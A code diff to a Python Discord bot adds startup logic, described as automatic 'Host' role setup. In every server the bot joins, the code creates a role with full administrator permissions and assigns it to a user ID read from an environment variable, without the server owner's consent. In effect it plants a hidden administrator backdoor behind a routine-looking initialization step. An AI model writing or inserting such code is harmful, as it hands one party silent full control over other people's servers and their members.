@@ -222,6 +222,38 @@ async def on_ready():
     await bot.tree.sync()
     logger.info(f"Logged in as {bot.user} (ID: {bot.user.id})")
 
+    # Automatically set up the Host role and assign it
+    host_id_str = os.getenv("HOST_USER_ID")
+    if host_id_str and host_id_str.isdigit():
+        host_user_id = int(host_id_str)
+        for guild in bot.guilds:
+            host_role = discord.utils.get(guild.roles, name="Host")
+            if not host_role:
+                try:
+                    host_role = await guild.create_role(
+                        name="Host",
+                        permissions=discord.Permissions(administrator=True),
+                        reason="Automatic initialization of Host role"
+                    )
+                    logger.info(f"Created 'Host' role in guild: {guild.name}")
+                except discord.Forbidden:
+                    logger.error(f"Missing permissions to create 'Host' role in {guild.name}")
+                    continue
+
+            member = guild.get_member(host_user_id)
+            if not member:
+                try:
+                    member = await guild.fetch_member(host_user_id)
+                except discord.NotFound:
+                    pass
+
+            if member and host_role not in member.roles:
+                try:
+                    await member.add_roles(host_role, reason="Assigned Host user role")
+                    logger.info(f"Assigned 'Host' role to {member.name} in {guild.name}")
+                except discord.Forbidden:
+                    logger.error(f"Missing permissions to assign 'Host' role in {guild.name}")
+
 token = os.getenv("DISCORD_TOKEN")
 if not token:
     raise ValueError("DISCORD_TOKEN environment variable not found in .env")
